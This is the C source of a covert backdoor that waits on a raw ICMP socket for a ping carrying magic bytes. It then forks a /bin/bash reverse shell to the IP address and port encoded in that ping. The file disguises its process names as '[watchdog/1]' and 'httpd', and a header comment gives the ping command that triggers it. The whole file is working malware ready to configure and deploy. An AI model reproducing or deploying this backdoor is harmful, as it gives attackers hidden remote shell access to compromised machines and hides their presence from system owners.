// ping -c 1 -p 0a0a001710002a7e 10.10.0.23
// pattern = <ip in hexadecimal><port in hexadecimal><two magic bytes>
// this will spawn a reverse shell to ip:port

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>


/* You should change these */
#define MAGIC1		0x2a
#define MAGIC2		0x7e
#define SHELLNAME	"httpd"
#define PARENTNAME      "[watchdog/1]"
#define SHELL		"/bin/bash"


int main(int argc, char *argv[]) {
  int			s;
  int			c;
  int			n;
  char			buf[1024];
  unsigned char		ip[4];
  char			ipstr[15];
  unsigned char		portstr[2];
  unsigned short	port;
  struct sockaddr_in	shell;


  if (strlen(argv[0]) >= strlen(PARENTNAME)) {
    memset(argv[0], '\0', strlen(argv[0]));
    strcpy(argv[0], PARENTNAME);
  }

  /* Reap child processes */
  signal(SIGCHLD, SIG_IGN);

  s = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (s == -1) {
    fprintf(stderr, "socket(): %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  for (;;) {
    memset(buf, 0, sizeof(buf));

    n = recv(s, buf, sizeof(buf), 0);
    if (n > 51) {
      /* Check for magic bytes */
      if (buf[50] != MAGIC1 || buf[51] != MAGIC2)
	continue;

      ip[0] = buf[44];
      ip[1] = buf[45];
      ip[2] = buf[46];
      ip[3] = buf[47];

      portstr[0] = buf[48];
      portstr[1] = buf[49];

      port = portstr[0] << 8 | portstr[1];
      sprintf(ipstr, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

      if (fork() == 0) {
	/* Fairly standard reverse shell */
	shell.sin_family = AF_INET;
	shell.sin_port = htons(port);
	shell.sin_addr.s_addr = inet_addr(ipstr);

	c = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	connect(c, (struct sockaddr *)&shell, sizeof(shell));

	dup2(c, STDERR_FILENO);
	dup2(c, STDOUT_FILENO);
	dup2(c, STDIN_FILENO);

	execl(SHELL, SHELLNAME, NULL);
      }
    }
  }

  return EXIT_SUCCESS;
}

